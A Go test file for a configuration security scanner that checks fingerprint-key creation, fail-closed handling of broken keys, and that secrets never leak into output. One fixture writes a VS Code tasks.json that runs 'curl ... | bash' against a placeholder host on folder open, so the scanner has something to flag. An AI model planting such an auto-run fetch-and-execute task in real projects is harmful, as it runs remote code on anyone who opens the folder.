package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/vgmartinez/tripcord/internal/exitcode"
	"github.com/vgmartinez/tripcord/internal/fpkey"
	"github.com/vgmartinez/tripcord/internal/model"
)

// These tests set process environment, so none of them is parallel.

const keyTestSecret = "zsK01q-mcp-secret"

func keyTestRepo(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	mcp := `{"mcpServers":{"app":{"command":"docker","args":["run","-e","PRIVATE_KEY=` + keyTestSecret + `","img:1"]}}}`
	if err := os.WriteFile(filepath.Join(root, ".mcp.json"), []byte(mcp), 0o600); err != nil {
		t.Fatal(err)
	}
	return root
}

func setKeyEnv(t *testing.T, home string, vars map[string]string) {
	t.Helper()
	t.Setenv("HOME", home)
	t.Setenv("USERPROFILE", home)
	for _, name := range []string{"CI", "GITHUB_ACTIONS", fpkey.EnvVar} {
		t.Setenv(name, vars[name])
	}
}

func scanAllFormats(t *testing.T, root string, wantCode exitcode.Code) string {
	t.Helper()
	var all strings.Builder
	for _, format := range []string{"text", "json", "sarif", "md", "gha"} {
		var stdout, stderr bytes.Buffer
		if code := run([]string{"scan", "--format", format, root}, &stdout, &stderr); code != int(wantCode) {
			t.Fatalf("%s: exit %d, want %d; stderr: %s", format, code, wantCode, stderr.String())
		}
		all.WriteString(stdout.String())
		all.WriteString(stderr.String())
	}
	return all.String()
}

func TestScanCreatesKeyFileLocally(t *testing.T) {
	home := t.TempDir()
	setKeyEnv(t, home, nil)
	out := scanAllFormats(t, keyTestRepo(t), exitcode.OK)
	info, err := os.Stat(fpkey.Path(home))
	if err != nil {
		t.Fatalf("local scan did not create %s: %v", fpkey.LogicalPath, err)
	}
	if runtime.GOOS != "windows" && info.Mode().Perm() != 0o600 {
		t.Fatalf("key file mode %o, want 600", info.Mode().Perm())
	}
	key, err := os.ReadFile(fpkey.Path(home))
	if err != nil {
		t.Fatal(err)
	}
	if k := strings.TrimSpace(string(key)); len(k) < fpkey.MinKeyBytes || strings.Contains(out, k) {
		t.Fatalf("key missing or printed (len %d)", len(k))
	}
	if strings.Contains(out, keyTestSecret) {
		t.Fatalf("output leaks the secret:\n%s", out)
	}
}

func TestScanNeverCreatesKeyFileInCI(t *testing.T) {
	for _, vars := range []map[string]string{{"CI": "true"}, {"GITHUB_ACTIONS": "true"}} {
		home := t.TempDir()
		setKeyEnv(t, home, vars)
		scanAllFormats(t, keyTestRepo(t), exitcode.OK)
		if _, err := os.Stat(filepath.Dir(fpkey.Path(home))); !errors.Is(err, fs.ErrNotExist) {
			t.Fatalf("%v: CI scan created %s: %v", vars, fpkey.LogicalPath, err)
		}
	}
}

// TestScanPrintsCINoteOnce is the researcher review's request: the docs
// promise a stderr note in CI when no key source exists at all, and it
// must actually be printed (one scan, one note), not silently skipped
// the way a nil error from fpkey.Load previously caused.
func TestScanPrintsCINoteOnce(t *testing.T) {
	home := t.TempDir()
	setKeyEnv(t, home, map[string]string{"CI": "true"})
	var stdout, stderr bytes.Buffer
	if code := run([]string{"scan", "--format", "text", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.OK) {
		t.Fatalf("exit %d; stderr: %s", code, stderr.String())
	}
	const note = "CI detected: fingerprint key not created, using s1"
	if stderr.String() != "tripcord scan: "+note+"\n" {
		t.Fatalf("stderr = %q, want the CI note and nothing else", stderr.String())
	}
}

func TestScanEnvKeyNeverPrinted(t *testing.T) {
	const key = "beeffacebeeffacebeeffacebeeffacebeeffacebeeffacebeeffacebeefface"
	home := t.TempDir()
	setKeyEnv(t, home, map[string]string{"CI": "true", fpkey.EnvVar: key})
	out := scanAllFormats(t, keyTestRepo(t), exitcode.OK)
	if strings.Contains(out, key) || strings.Contains(out, keyTestSecret) {
		t.Fatalf("output leaks the key or the secret:\n%s", out)
	}
	if _, err := os.Stat(filepath.Dir(fpkey.Path(home))); !errors.Is(err, fs.ErrNotExist) {
		t.Fatalf("env key still created a key file: %v", err)
	}
}

func TestScanRejectsShortEnvKey(t *testing.T) {
	const key = "zsShortKey"
	setKeyEnv(t, t.TempDir(), map[string]string{fpkey.EnvVar: key})
	var stdout, stderr bytes.Buffer
	if code := run([]string{"scan", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("exit %d, want %d; stderr: %s", code, exitcode.Config, stderr.String())
	}
	if !strings.Contains(stderr.String(), fpkey.EnvVar) || strings.Contains(stdout.String()+stderr.String(), key) {
		t.Fatalf("stderr = %q", stderr.String())
	}
}

// TestScanRejectsOddLengthEnvKey: an odd number of hex characters cannot
// be decoded, so TRIPCORD_FINGERPRINT_KEY must exit 3 rather than be
// truncated into a different key.
func TestScanRejectsOddLengthEnvKey(t *testing.T) {
	const key = "0123456789abcdef0123456789abcdefa" // 33: past the 32-char minimum, and odd
	if len(key) != 33 {
		t.Fatalf("key length %d, want 33", len(key))
	}
	setKeyEnv(t, t.TempDir(), map[string]string{fpkey.EnvVar: key})
	var stdout, stderr bytes.Buffer
	if code := run([]string{"scan", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("exit %d, want %d; stderr: %s", code, exitcode.Config, stderr.String())
	}
	if !strings.Contains(stderr.String(), "odd") || strings.Contains(stdout.String()+stderr.String(), key) {
		t.Fatalf("stderr = %q", stderr.String())
	}
}

func TestScanFallsBackToS1WhenNoKeySourceExists(t *testing.T) {
	// A fresh home has no env var and no key file at all; a read-only
	// home means a new key file cannot be created either. Neither
	// touches existing key material, so the scan still succeeds in s1
	// mode.
	home := t.TempDir()
	if err := os.Chmod(home, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(home, 0o700) })
	setKeyEnv(t, home, nil)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"scan", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.OK) {
		t.Fatalf("exit %d; stderr: %s", code, stderr.String())
	}
	if !strings.Contains(stderr.String(), "s1") || strings.Contains(stderr.String(), home) {
		t.Fatalf("stderr = %q", stderr.String())
	}
}

// TestScanFailsClosedOnBrokenKeyMaterial covers the researcher's
// requirement that broken EXISTING key material fails the scan closed
// (exit 3) instead of silently falling back to s1 the way a genuinely
// missing key source does.
func TestScanFailsClosedOnBrokenKeyMaterial(t *testing.T) {
	for name, setup := range map[string]func(t *testing.T, home string){
		"home dir is a regular file": func(t *testing.T, home string) {
			t.Helper()
			if err := os.WriteFile(filepath.Join(home, ".tripcord"), nil, 0o600); err != nil {
				t.Fatal(err)
			}
		},
		"key path is a directory": func(t *testing.T, home string) {
			t.Helper()
			if err := os.MkdirAll(fpkey.Path(home), 0o700); err != nil {
				t.Fatal(err)
			}
		},
		"key file is a broken symlink": func(t *testing.T, home string) {
			t.Helper()
			if err := os.MkdirAll(filepath.Dir(fpkey.Path(home)), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(filepath.Join(home, "missing"), fpkey.Path(home)); err != nil {
				t.Fatal(err)
			}
		},
		"key file content is too short": func(t *testing.T, home string) {
			t.Helper()
			if err := os.MkdirAll(filepath.Dir(fpkey.Path(home)), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(fpkey.Path(home), []byte("short\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		},
		// Researcher review bug 2: a corrupt key file previously gave
		// rc=0 with a silently different fingerprint instead of exit 3.
		"key file is 20 truncated hex characters": func(t *testing.T, home string) {
			t.Helper()
			if err := os.MkdirAll(filepath.Dir(fpkey.Path(home)), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(fpkey.Path(home), []byte("0123456789abcdef0123\n"), 0o600); err != nil {
				t.Fatal(err)
			}
		},
		"key file is 40 bytes of non-hex binary-shaped content": func(t *testing.T, home string) {
			t.Helper()
			if err := os.MkdirAll(filepath.Dir(fpkey.Path(home)), 0o700); err != nil {
				t.Fatal(err)
			}
			junk := make([]byte, 40)
			for i := range junk {
				junk[i] = byte('g' + i%5) // printable, never a hex digit
			}
			if err := os.WriteFile(fpkey.Path(home), junk, 0o600); err != nil {
				t.Fatal(err)
			}
		},
	} {
		t.Run(name, func(t *testing.T) {
			home := t.TempDir()
			setup(t, home)
			setKeyEnv(t, home, nil)
			var stdout, stderr bytes.Buffer
			if code := run([]string{"scan", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.Config) {
				t.Fatalf("exit %d, want %d; stderr: %s", code, exitcode.Config, stderr.String())
			}
			if strings.Contains(stderr.String(), "s1") {
				t.Fatalf("broken key material silently fell back to s1: %q", stderr.String())
			}
			if strings.Contains(stderr.String(), home) {
				t.Fatalf("stderr names the home directory: %q", stderr.String())
			}
		})
	}
}

func TestScanFailsClosedOnLoosePermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("permission bits are not meaningful on Windows; see fpkey_windows.go")
	}
	home := t.TempDir()
	if err := os.MkdirAll(filepath.Dir(fpkey.Path(home)), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(fpkey.Path(home), []byte("beeffacebeeffacebeeffacebeeffacebeeffacebeeffacebeeffacebeefface\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	setKeyEnv(t, home, nil)
	var stdout, stderr bytes.Buffer
	if code := run([]string{"scan", keyTestRepo(t)}, &stdout, &stderr); code != int(exitcode.Config) {
		t.Fatalf("exit %d, want %d; stderr: %s", code, exitcode.Config, stderr.String())
	}
	if strings.Contains(stderr.String(), "s1") {
		t.Fatalf("overly permissive key file silently fell back to s1: %q", stderr.String())
	}
}

// TestScanHarnessTasksOnlyIsKeyed checks that .vscode/tasks.json, which
// a --harness scan reads through the tasks-only shared adapter, gets k1
// fingerprints when a key is set, and s1 in CI without one.
func TestScanHarnessTasksOnlyIsKeyed(t *testing.T) {
	const secret = "zsT01q-task-secret"
	root := t.TempDir()
	if err := os.Mkdir(filepath.Join(root, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	tasks := `{"version": "2.0.0", "tasks": [{"label": "bootstrap", "type": "shell", "command": "curl -H 'Authorization: Bearer ` + secret + `' https://cdn.example.invalid/b.sh | bash", "runOptions": {"runOn": "folderOpen"}}]}`
	if err := os.MkdirAll(filepath.Join(root, ".vscode"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, ".vscode", "tasks.json"), []byte(tasks), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		mode string
		env  map[string]string
	}{
		{"k1", map[string]string{fpkey.EnvVar: noCINote}},
		{"s1", map[string]string{"CI": "true"}},
	} {
		setKeyEnv(t, t.TempDir(), tc.env)
		var stdout, stderr bytes.Buffer
		if code := run([]string{"scan", "--harness", "claude", "--format", "json", root}, &stdout, &stderr); code != int(exitcode.Findings) {
			t.Fatalf("%s: exit %d; stderr: %s", tc.mode, code, stderr.String())
		}
		if strings.Contains(stdout.String(), secret) || strings.Contains(stderr.String(), secret) {
			t.Fatalf("%s: output leaks the secret:\n%s%s", tc.mode, stdout.String(), stderr.String())
		}
		var found int
		for _, line := range strings.Split(strings.TrimSpace(stdout.String()), "\n") {
			var f model.Finding
			if json.Unmarshal([]byte(line), &f) != nil || f.Rule != "TC-CFG-002" {
				continue
			}
			found++
			if got := model.FingerprintMode(f.Evidence); got != tc.mode {
				t.Fatalf("tasks.json finding under --harness claude is %q, want %s: %s", got, tc.mode, line)
			}
		}
		if found != 1 {
			t.Fatalf("%s: TC-CFG-002 findings = %d, want 1:\n%s", tc.mode, found, stdout.String())
		}
	}
}
